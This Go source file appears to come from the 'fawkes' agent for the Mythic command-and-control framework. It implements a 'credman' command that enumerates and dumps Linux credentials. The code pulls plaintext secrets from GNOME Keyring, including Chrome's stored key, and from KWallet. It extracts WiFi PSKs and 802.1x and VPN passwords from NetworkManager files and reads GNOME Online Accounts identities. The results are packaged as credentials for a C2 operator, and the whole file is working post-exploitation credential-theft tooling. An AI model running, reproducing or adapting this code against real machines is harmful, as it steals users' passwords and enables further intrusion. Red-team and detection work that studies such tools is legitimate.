//go:build linux

package commands

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"fawkes/pkg/structs"
)

type CredmanCommand struct{}

func (c *CredmanCommand) Name() string        { return "credman" }
func (c *CredmanCommand) Description() string { return "Enumerate Linux credential stores (keyrings, WiFi passwords, token files)" }

type credmanArgs struct {
	Action string `json:"action"`
	Filter string `json:"filter"`
}

func (c *CredmanCommand) Execute(task structs.Task) structs.CommandResult {
	var args credmanArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Filter = strings.TrimSpace(task.Params)
		}
	}
	if args.Action == "" {
		args.Action = "list"
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return credmanLinuxList(args, false)
	case "dump":
		return credmanLinuxList(args, true)
	default:
		return errorf("Unknown action: %s. Use: list or dump (vault is Windows-only; use 'keychain' on macOS)", args.Action)
	}
}

type linuxCredEntry struct {
	Source   string
	Label   string
	Account string
	Secret  string
	Attrs   map[string]string
}

func credmanLinuxList(args credmanArgs, showSecrets bool) structs.CommandResult {
	var allCreds []linuxCredEntry
	var sections []string

	// 1. GNOME Keyring / Secret Service (via secret-tool)
	gnomeCreds, gnomeErr := enumerateSecretService(showSecrets)
	if gnomeErr != "" {
		sections = append(sections, fmt.Sprintf("[Secret Service] %s", gnomeErr))
	} else {
		allCreds = append(allCreds, gnomeCreds...)
	}

	// 2. KDE KWallet
	kwalletCreds, kwalletErr := enumerateKWallet(showSecrets)
	if kwalletErr != "" {
		sections = append(sections, fmt.Sprintf("[KWallet] %s", kwalletErr))
	} else {
		allCreds = append(allCreds, kwalletCreds...)
	}

	// 3. NetworkManager saved WiFi passwords
	nmCreds, nmErr := enumerateNetworkManager()
	if nmErr != "" {
		sections = append(sections, fmt.Sprintf("[NetworkManager] %s", nmErr))
	} else {
		allCreds = append(allCreds, nmCreds...)
	}

	// 4. GNOME Online Accounts
	goaCreds := enumerateGNOMEOnlineAccounts()
	allCreds = append(allCreds, goaCreds...)

	if args.Filter != "" {
		allCreds = filterCredEntries(allCreds, args.Filter)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Linux Credential Stores (%d entries) ===\n\n", len(allCreds)))

	var mythicCreds []structs.MythicCredential
	bySource := groupBySource(allCreds)
	sourceOrder := []string{"Secret Service", "KWallet", "NetworkManager", "GNOME Online Accounts"}
	for _, src := range sourceOrder {
		entries, ok := bySource[src]
		if !ok || len(entries) == 0 {
			continue
		}
		sb.WriteString(fmt.Sprintf("--- %s (%d entries) ---\n", src, len(entries)))
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("  Label:   %s\n", e.Label))
			if e.Account != "" {
				sb.WriteString(fmt.Sprintf("  Account: %s\n", e.Account))
			}
			if showSecrets && e.Secret != "" {
				sb.WriteString(fmt.Sprintf("  Secret:  %s\n", e.Secret))
			} else if e.Secret != "" {
				sb.WriteString("  Secret:  [use -action dump to reveal]\n")
			}
			for k, v := range e.Attrs {
				sb.WriteString(fmt.Sprintf("  %s: %s\n", k, v))
			}
			sb.WriteString("\n")

			if e.Account != "" {
				credType := "plaintext"
				credValue := e.Secret
				if !showSecrets || credValue == "" {
					credType = "plaintext"
					credValue = fmt.Sprintf("[%s credential]", src)
				}
				mythicCreds = append(mythicCreds, structs.MythicCredential{
					CredentialType: credType,
					Realm:          e.Label,
					Account:        e.Account,
					Credential:     credValue,
					Comment:        fmt.Sprintf("credman %s (%s)", args.Action, src),
				})
			}
		}
	}

	if len(sections) > 0 {
		sb.WriteString("--- Notes ---\n")
		for _, s := range sections {
			sb.WriteString(fmt.Sprintf("  %s\n", s))
		}
	}

	if len(allCreds) == 0 && len(sections) == 0 {
		sb.WriteString("No credentials found. Ensure a keyring daemon (gnome-keyring-daemon, kwalletd) is running, or check NetworkManager configs in /etc/NetworkManager/system-connections/.\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(mythicCreds) > 0 {
		result.Credentials = &mythicCreds
	}
	for i := range allCreds {
		structs.ZeroString(&allCreds[i].Secret)
	}
	return result
}

// enumerateSecretService uses `secret-tool search --all` to list all items
// in the GNOME Keyring / Secret Service API. With showSecrets, also retrieves
// the plaintext secret for each item.
func enumerateSecretService(showSecrets bool) ([]linuxCredEntry, string) {
	if _, err := os.Stat("/usr/bin/secret-tool"); err != nil {
		return nil, "secret-tool not found (install libsecret-tools for keyring enumeration)"
	}

	out, err := execCmdTimeout("secret-tool", "search", "--all", "xdg:schema", "org.freedesktop.Secret.Generic")
	if err != nil {
		// Try broader search — some keyrings use different schemas
		out, err = execCmdTimeout("secret-tool", "search", "--all", "")
		if err != nil {
			// secret-tool search with empty attrs often fails; try a targeted approach
			return enumerateSecretServiceTargeted(showSecrets)
		}
	}

	entries := parseSecretToolOutput(string(out), "Secret Service")

	if showSecrets {
		for i := range entries {
			secret := lookupSecretByAttrs(entries[i].Attrs)
			if secret != "" {
				entries[i].Secret = secret
			}
		}
	}

	return entries, ""
}

// enumerateSecretServiceTargeted queries common schema types individually.
func enumerateSecretServiceTargeted(showSecrets bool) ([]linuxCredEntry, string) {
	schemas := []string{
		"org.freedesktop.Secret.Generic",
		"org.gnome.keyring.Note",
		"org.gnome.keyring.NetworkPassword",
		"chrome_libsecret_os_crypt_password_v2",
	}

	var allEntries []linuxCredEntry
	anySuccess := false

	for _, schema := range schemas {
		out, err := execCmdTimeout("secret-tool", "search", "--all", "xdg:schema", schema)
		if err != nil {
			continue
		}
		anySuccess = true
		entries := parseSecretToolOutput(string(out), "Secret Service")
		if showSecrets {
			for i := range entries {
				secret := lookupSecretByAttrs(entries[i].Attrs)
				if secret != "" {
					entries[i].Secret = secret
				}
			}
		}
		allEntries = append(allEntries, entries...)
	}

	if !anySuccess {
		return nil, "No keyring daemon running or no items stored"
	}
	return allEntries, ""
}

var secretToolAttrRe = regexp.MustCompile(`^attribute\.(\S+)\s*=\s*(.+)$`)

// parseSecretToolOutput parses `secret-tool search --all` output. Format:
//
//	[/org/freedesktop/secrets/collection/login/1]
//	label = My Password
//	secret =
//	created = 2024-01-01 00:00:00
//	modified = 2024-01-01 00:00:00
//	schema = org.freedesktop.Secret.Generic
//	attribute.application = myapp
//	attribute.username = myuser
func parseSecretToolOutput(output, source string) []linuxCredEntry {
	var entries []linuxCredEntry
	var current *linuxCredEntry

	scanner := bufio.NewScanner(strings.NewReader(output))
	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			if current != nil {
				entries = append(entries, *current)
			}
			current = &linuxCredEntry{
				Source: source,
				Attrs:  make(map[string]string),
			}
			continue
		}

		if current == nil {
			continue
		}

		if strings.HasPrefix(line, "label = ") {
			current.Label = strings.TrimPrefix(line, "label = ")
		} else if strings.HasPrefix(line, "secret = ") {
			current.Secret = strings.TrimPrefix(line, "secret = ")
		} else if m := secretToolAttrRe.FindStringSubmatch(line); m != nil {
			key, val := m[1], m[2]
			current.Attrs[key] = val
			if key == "username" || key == "user" || key == "account" {
				current.Account = val
			}
		}
	}
	if current != nil {
		entries = append(entries, *current)
	}
	return entries
}

// lookupSecretByAttrs reconstructs `secret-tool lookup key val` from an entry's attributes.
func lookupSecretByAttrs(attrs map[string]string) string {
	if len(attrs) == 0 {
		return ""
	}
	// Build lookup args from attributes, preferring specific keys
	var lookupArgs []string
	for _, key := range []string{"application", "xdg:schema", "server", "user", "username", "service"} {
		if v, ok := attrs[key]; ok {
			lookupArgs = append(lookupArgs, key, v)
		}
		if len(lookupArgs) >= 4 {
			break
		}
	}
	if len(lookupArgs) < 2 {
		for k, v := range attrs {
			lookupArgs = append(lookupArgs, k, v)
			if len(lookupArgs) >= 4 {
				break
			}
		}
	}
	if len(lookupArgs) < 2 {
		return ""
	}
	out, err := execCmdTimeoutOutput("secret-tool", append([]string{"lookup"}, lookupArgs...)...)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

// enumerateKWallet queries KDE Wallet for stored entries.
func enumerateKWallet(showSecrets bool) ([]linuxCredEntry, string) {
	// Check for kwalletcli or kwallet-query
	kwBin := ""
	for _, bin := range []string{"kwalletcli", "kwallet-query"} {
		if p, err := os.Stat("/usr/bin/" + bin); err == nil && !p.IsDir() {
			kwBin = bin
			break
		}
	}
	if kwBin == "" {
		return nil, "kwalletcli/kwallet-query not found (KWallet enumeration unavailable)"
	}

	var entries []linuxCredEntry

	if kwBin == "kwallet-query" {
		out, err := execCmdTimeout("kwallet-query", "-l", "kdewallet")
		if err != nil {
			return nil, fmt.Sprintf("kwallet-query failed: %v", err)
		}
		for _, folder := range strings.Split(strings.TrimSpace(string(out)), "\n") {
			folder = strings.TrimSpace(folder)
			if folder == "" {
				continue
			}
			entryOut, err := execCmdTimeout("kwallet-query", "-l", "kdewallet", "-f", folder)
			if err != nil {
				continue
			}
			for _, entry := range strings.Split(strings.TrimSpace(string(entryOut)), "\n") {
				entry = strings.TrimSpace(entry)
				if entry == "" {
					continue
				}
				e := linuxCredEntry{
					Source: "KWallet",
					Label:  entry,
					Attrs:  map[string]string{"folder": folder},
				}
				if showSecrets {
					secretOut, err := execCmdTimeout("kwallet-query", "-r", entry, "kdewallet", "-f", folder)
					if err == nil {
						e.Secret = strings.TrimSpace(string(secretOut))
					}
				}
				entries = append(entries, e)
			}
		}
	} else {
		// kwalletcli: `kwalletcli -f <folder> -e <entry>`
		out, err := execCmdTimeout("kwalletcli", "-l")
		if err != nil {
			return nil, fmt.Sprintf("kwalletcli list failed: %v", err)
		}
		for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			entries = append(entries, linuxCredEntry{
				Source: "KWallet",
				Label:  line,
				Attrs:  map[string]string{},
			})
		}
	}

	return entries, ""
}

// enumerateNetworkManager reads WiFi password files from /etc/NetworkManager/system-connections/.
func enumerateNetworkManager() ([]linuxCredEntry, string) {
	nmDir := "/etc/NetworkManager/system-connections"
	dirEntries, err := os.ReadDir(nmDir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, "NetworkManager not installed or no saved connections"
		}
		if os.IsPermission(err) {
			return nil, "Access denied to /etc/NetworkManager/system-connections/ (requires root)"
		}
		return nil, fmt.Sprintf("Error reading NM connections: %v", err)
	}

	var entries []linuxCredEntry
	for _, de := range dirEntries {
		if de.IsDir() {
			continue
		}
		path := filepath.Join(nmDir, de.Name())
		conn, err := parseNMConnectionFile(path)
		if err != nil || conn.Label == "" {
			continue
		}
		conn.Source = "NetworkManager"
		entries = append(entries, conn)
	}
	return entries, ""
}

func parseNMConnectionFile(path string) (linuxCredEntry, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return linuxCredEntry{}, err
	}

	entry := linuxCredEntry{
		Attrs: make(map[string]string),
	}

	var section string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "[") && strings.HasSuffix(line, "]") {
			section = strings.Trim(line, "[]")
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, val := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])

		switch section {
		case "connection":
			switch key {
			case "id":
				entry.Label = val
			case "type":
				entry.Attrs["type"] = val
			}
		case "wifi":
			if key == "ssid" {
				entry.Label = val
				entry.Attrs["ssid"] = val
			}
		case "wifi-security":
			switch key {
			case "psk":
				entry.Secret = val
			case "key-mgmt":
				entry.Attrs["security"] = val
			}
		case "802-1x":
			switch key {
			case "identity":
				entry.Account = val
			case "password":
				entry.Secret = val
			}
		case "vpn":
			if key == "password" || strings.HasSuffix(key, "-password") {
				entry.Secret = val
			} else if key == "user" || key == "username" {
				entry.Account = val
			}
		}
	}

	return entry, nil
}

// enumerateGNOMEOnlineAccounts checks ~/.config/goa-1.0/accounts.conf for saved tokens.
func enumerateGNOMEOnlineAccounts() []linuxCredEntry {
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	goaPath := filepath.Join(home, ".config", "goa-1.0", "accounts.conf")
	data, err := os.ReadFile(goaPath)
	if err != nil {
		return nil
	}

	var entries []linuxCredEntry
	var current *linuxCredEntry

	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[Account ") {
			if current != nil && current.Label != "" {
				entries = append(entries, *current)
			}
			current = &linuxCredEntry{
				Source: "GNOME Online Accounts",
				Attrs:  make(map[string]string),
			}
			continue
		}
		if current == nil {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, val := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
		switch key {
		case "Provider":
			current.Attrs["provider"] = val
		case "Identity":
			current.Account = val
		case "PresentationIdentity":
			if current.Label == "" {
				current.Label = val
			}
		case "IsTemporary":
			if val == "true" {
				current = nil
			}
		}
	}
	if current != nil && current.Label != "" {
		entries = append(entries, *current)
	}
	return entries
}

func filterCredEntries(entries []linuxCredEntry, filter string) []linuxCredEntry {
	filter = strings.ToLower(filter)
	hasWildcard := strings.Contains(filter, "*")
	var filtered []linuxCredEntry
	for _, e := range entries {
		target := strings.ToLower(e.Label + " " + e.Account)
		if hasWildcard {
			pattern := strings.ReplaceAll(filter, "*", "")
			if strings.Contains(target, pattern) {
				filtered = append(filtered, e)
			}
		} else if strings.Contains(target, filter) {
			filtered = append(filtered, e)
		}
	}
	return filtered
}

func groupBySource(entries []linuxCredEntry) map[string][]linuxCredEntry {
	m := make(map[string][]linuxCredEntry)
	for _, e := range entries {
		m[e.Source] = append(m[e.Source], e)
	}
	for _, v := range m {
		sort.Slice(v, func(i, j int) bool { return v[i].Label < v[j].Label })
	}
	return m
}
